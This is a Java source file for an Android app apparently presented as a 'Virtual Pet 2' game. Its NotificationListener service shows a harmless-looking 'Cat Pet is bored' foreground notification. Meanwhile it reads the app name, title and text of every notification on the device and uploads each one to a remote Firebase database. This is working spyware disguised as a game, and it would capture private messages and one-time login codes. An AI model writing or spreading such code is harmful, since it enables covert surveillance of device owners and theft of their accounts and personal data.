// File: NotificationListener.java
package com.example.virtualpet2;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private DatabaseReference databaseReference;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationListener service started");

        databaseReference = FirebaseDatabase.getInstance().getReference("notifications");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "notification_channel_id",
                    "Notification Listener Channel",
                    NotificationManager.IMPORTANCE_LOW
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);

            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            startForeground(1, new android.app.Notification.Builder(this, "notification_channel_id")
                    .setContentTitle("Virtual Pet 2")
                    .setContentText("Cat Pet is bored")
                    .setSmallIcon(R.drawable.ic_notification)
                    .build());
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        String packageName = sbn.getPackageName();
        CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");

        Log.d(TAG, "Notification details - Package: " + packageName + ", Title: " + title + ", Text: " + text);

        NotificationLog notificationLog = new NotificationLog(packageName, title != null ? title.toString() : "", text != null ? text.toString() : "", System.currentTimeMillis());
        databaseReference.push().setValue(notificationLog);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }
}
